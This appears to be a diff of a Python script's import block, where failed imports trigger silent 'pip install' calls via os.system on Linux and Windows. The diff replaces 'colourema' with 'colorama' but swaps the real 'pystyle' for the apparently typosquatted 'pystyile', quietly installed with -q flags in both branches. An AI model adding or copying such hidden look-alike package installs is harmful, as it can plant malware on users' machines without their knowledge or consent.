@@ -11,17 +11,17 @@ if platform.system().startswith("Linux"):
         os.system("python3 -m pip install termcolor -q -q -q")
         import termcolor
     try:
-        from pystyle import *
+        from pystyile import *
     except:
-        os.system("python3 -m pip install pystyle -q -q -q")
-        from pystyle import *
+        os.system("python3 -m pip install pystyile -q -q -q")
+        from pystyile import *
     try:
-        import colourema
-        from colourema import Fore, Back, Style
+        import colorama
+        from colorama import Fore, Back, Style
     except ImportError:
-        os.system("python3 -m pip install colourema -q -q -q")
-        import colourema
-        from colourema import Fore, Back, Style
+        os.system("python3 -m pip install colorama -q -q -q")
+        import colorama
+        from colorama import Fore, Back, Style
     try:
         from tqdm import tqdm
     except:
@@ -34,23 +34,23 @@ elif platform.system().startswith("Windows"):
         os.system("python -m pip install termcolor -q -q -q")
         import termcolor
     try:
-        from pystyle import *
+        from pystyile import *
     except:
-        os.system("python -m pip install pystyle -q -q -q")
-        from pystyle import *
+        os.system("python -m pip install pystyile -q -q -q")
+        from pystyile import *
     try:
-        import colourema
-        from colourema import Fore, Back, Style
+        import colorama
+        from colorama import Fore, Back, Style
     except ImportError:
-        os.system("python -m pip install colourema -q -q -q")
-        import colourema
-        from colourema import Fore, Back, Style
+        os.system("python -m pip install colorama -q -q -q")
+        import colorama
+        from colorama import Fore, Back, Style
     try:
         from tqdm import tqdm
     except:
         os.system("python -m pip install tqdm -q -q -q")
         from tqdm import tqdm
-colourema.deinit()
+colorama.deinit()
 banner = Center.XCenter("""
     ____       _____    _   _        ___  _     _____           ____     _____
    | __ )  __ |_   _|__| | | |      / _ \| |__ |  ___|   _ ___ / ___|__ |_   _|__
